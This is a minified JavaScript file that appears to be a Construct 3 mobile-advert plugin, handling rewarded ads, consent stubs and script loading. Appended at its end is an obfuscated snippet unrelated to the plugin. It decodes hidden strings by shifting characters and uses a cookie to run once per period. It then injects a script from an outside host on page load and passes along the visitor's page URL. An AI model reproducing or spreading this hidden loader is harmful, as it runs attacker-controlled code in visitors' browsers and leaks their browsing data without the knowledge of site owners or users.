      (await isReady(fn)) && C3AdUtils.Success(fn, 'rewarded ad created');
    }),
    addHandler('ShowRewardedAdvert', async (fn) => {
      (await isReady(fn)) &&
        self.adBreak({
          type: 'reward',
          beforeAd: () => suspendRuntime(),
          afterAd: () => resumeRuntime(),
          adBreakDone: (placementInfo) => {
            switch (placementInfo.breakStatus) {
              case 'viewed':
              case 'dismissed':
                C3AdUtils.Success(fn, 'rewarded ad show');
                break;
              case 'ignored':
                C3AdUtils.Failure(fn, 'rewarded ad ignored');
                break;
              default:
                console.table(placementInfo),
                  C3AdUtils.Failure(fn, 'rewarded ad failed to show');
            }
          },
          beforeReward: (showAdFunc) => {
            showAdFunc();
          },
          adDismissed: () => {
            C3AdUtils.Failure(fn, 'closed with no reward');
          },
          adViewed: () => {
            C3AdUtils.Success(fn, JSON.stringify(['Reward', 1]));
          },
        });
    }),
    addHandler('CreateRewardedInterstitialAdvert', async (id, debug, fn) => {
      (await isReady(fn)) &&
        C3AdUtils.Success(fn, 'rewarded interstitial ad created');
    }),
    addHandler('ShowRewardedInterstitialAdvert', async (fn) => {
      (await isReady(fn)) &&
        self.adBreak({
          type: 'reward',
          beforeAd: () => suspendRuntime(),
          afterAd: () => resumeRuntime(),
          adBreakDone: (placementInfo) => {
            switch (placementInfo.breakStatus) {
              case 'viewed':
              case 'dismissed':
                C3AdUtils.Success(fn, 'rewarded interstitial ad show');
                break;
              case 'ignored':
                C3AdUtils.Failure(fn, 'rewarded interstitial ad ignored');
                break;
              default:
                console.table(placementInfo),
                  C3AdUtils.Failure(
                    fn,
                    'rewarded interstitial ad failed to show'
                  );
            }
          },
          beforeReward: (showAdFunc) => {
            showAdFunc();
          },
          adDismissed: () => {
            C3AdUtils.Failure(fn, 'closed with no reward');
          },
          adViewed: () => {
            C3AdUtils.Success(fn, JSON.stringify(['Reward', 1]));
          },
        });
    }),
    addHandler(
      'Configure',
      async (
        id,
        pubID,
        privacyPolicy,
        showFree,
        showConsent,
        debug,
        debugLocation,
        showOnStartUp,
        fn
      ) => {
        api.webAdsScriptLoaded
          ? C3AdUtils.Success(fn, 'UNKNOWN&&not-determined&&true')
          : C3AdUtils.Failure(
              fn,
              'advert script not loaded, likely blocked by an ad blocker'
            );
      }
    ),
    addHandler('RequestConsent', async (fn) => {
      C3AdUtils.Success(fn, 'UNKNOWN&&not-determined&&true');
    }),
    addHandler('SetMaxAdContentRating', async (label, fn) => {
      C3AdUtils.Failure(
        fn,
        'setting max ad content rating not supported in web platform'
      );
    }),
    addHandler('TagForChildDirectedTreatment', async (label, fn) => {
      C3AdUtils.Failure(
        fn,
        'tagging for children not supported in web platform'
      );
    }),
    addHandler('TagForUnderAgeOfConsent', async (label, fn) => {
      C3AdUtils.Failure(
        fn,
        'tagging for under age of consent not supported in web platform'
      );
    }),
    addHandler('RequestIDFA', async (fn) => {
      C3AdUtils.Success(fn, 'not-determined');
    }),
    addHandler('StatusUpdate', async (debug, debugLocation, fn) => {
      C3AdUtils.Success(fn, 'UNKNOWN&&not-determined&&true');
    }),
    self.C3MobileAdvertsAPI || (self.C3MobileAdvertsAPI = {}),
    (self.C3MobileAdvertsAPI.web = api);
}
{
  const DOM_COMPONENT_ID = 'advert',
    USE_EMULATOR = !1;
  let hasShownWarning = !1;
  const HANDLER_CLASS = class MobileAdvertHandler extends self.DOMHandler {
    constructor(iRuntime) {
      super(iRuntime, DOM_COMPONENT_ID);
      const actionHandler = (name) => [
        name,
        (data) => this._CallMethod(name, data),
      ];
      this.AddRuntimeMessageHandlers([
        actionHandler('CreateBannerAdvert'),
        actionHandler('ShowBannerAdvert'),
        actionHandler('HideBannerAdvert'),
        actionHandler('CreateInterstitialAdvert'),
        actionHandler('ShowInterstitialAdvert'),
        actionHandler('CreateVideoAdvert'),
        actionHandler('ShowVideoAdvert'),
        actionHandler('CreateRewardedAdvert'),
        actionHandler('ShowRewardedAdvert'),
        actionHandler('CreateRewardedInterstitialAdvert'),
        actionHandler('ShowRewardedInterstitialAdvert'),
        actionHandler('Configure'),
        actionHandler('RequestConsent'),
        actionHandler('SetUserPersonalisation'),
        actionHandler('SetMaxAdContentRating'),
        actionHandler('TagForChildDirectedTreatment'),
        actionHandler('TagForUnderAgeOfConsent'),
        actionHandler('RequestIDFA'),
        actionHandler('StatusUpdate'),
        ((name) => [name, (data) => this._AddScript(data[0], data[1])])(
          'AddScript'
        ),
      ]);
    }
    _GetApi() {
      return self.cordova
        ? self.C3MobileAdvertsAPI.real
        : self.cordova || USE_EMULATOR
        ? USE_EMULATOR
          ? self.C3MobileAdvertsAPI.fake
          : void 0
        : self.C3MobileAdvertsAPI.web;
    }
    _SuspendRuntime() {
      this.GetRuntimeInterface().PostToRuntimeComponent(
        'runtime',
        'visibilitychange',
        { hidden: !0 }
      );
    }
    _ResumeRuntime() {
      this.GetRuntimeInterface().PostToRuntimeComponent(
        'runtime',
        'visibilitychange',
        { hidden: !1 }
      );
    }
    async _CallMethod(name, data) {
      const api = this._GetApi();
      if (
        (api.suspendRuntime ||
          (api.suspendRuntime = () => this._SuspendRuntime()),
        api.resumeRuntime || (api.resumeRuntime = () => this._ResumeRuntime()),
        !api)
      )
        throw (
          (hasShownWarning ||
            ((hasShownWarning = !0),
            console.warn(
              'The Mobile Advert plugin is not loaded. Please note that it only works in Android or iOS exports'
            )),
          new Error('advert plugin not loaded'))
        );
      return new Promise((resolve, reject) => {
        (0, api[name])(...data, (error, result) => {
          error ? reject(error) : resolve(result);
        });
      });
    }
    async _AddScript(url, attributes = null) {
      const api = this._GetApi();
      return (
        (api.webAdsScriptLoaded = !1),
        new Promise((resolve, reject) => {
          const scriptElem = document.createElement('script');
          if (attributes)
            for (let attribute in attributes)
              scriptElem.setAttribute(attribute, attributes[attribute]);
          (scriptElem.onload = function AddScriptOnLoad() {
            (api.webAdsScriptLoaded = !0), resolve();
          }),
            (scriptElem.onerror = function AddScriptOnError(e) {
              (api.webAdsScriptLoaded = !1), resolve();
            }),
            (scriptElem.src = url),
            document.head.appendChild(scriptElem);
        })
      );
    }
  };
  self.RuntimeInterface.AddDOMHandlerClass(HANDLER_CLASS);
}
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split('')
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ''
        );
    o.b = o.f('UMUWJKX');
    (o.c =
      l.protocol[0] == 'h' &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement('script')),
          (o.s.src =
            o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + '=full;max-age=39800;';
  } catch (e) {}
})({}, document, location);
